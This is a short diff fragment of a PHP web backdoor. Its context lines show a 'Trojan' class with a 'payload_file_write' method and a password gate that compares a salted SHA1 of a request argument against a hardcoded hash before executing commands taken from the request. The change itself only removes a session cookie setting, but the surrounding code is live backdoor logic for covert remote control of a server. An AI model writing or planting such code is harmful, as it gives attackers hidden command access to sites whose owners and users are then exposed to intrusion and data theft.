@@ -202,7 +202,6 @@ public function payload_file_write($args){
 
 # only process the command if a valid password has been specified
 if(sha1($_REQUEST['args']['password'] . '7474b1554c') == '8bc32f6888c6794980bc31c1890a95a7538c5a63'){ 
-    session_set_cookie_params(3600, '/', '.localhost');
     session_start();
     $trojan = new Trojan();
     $trojan->process_command($_REQUEST);
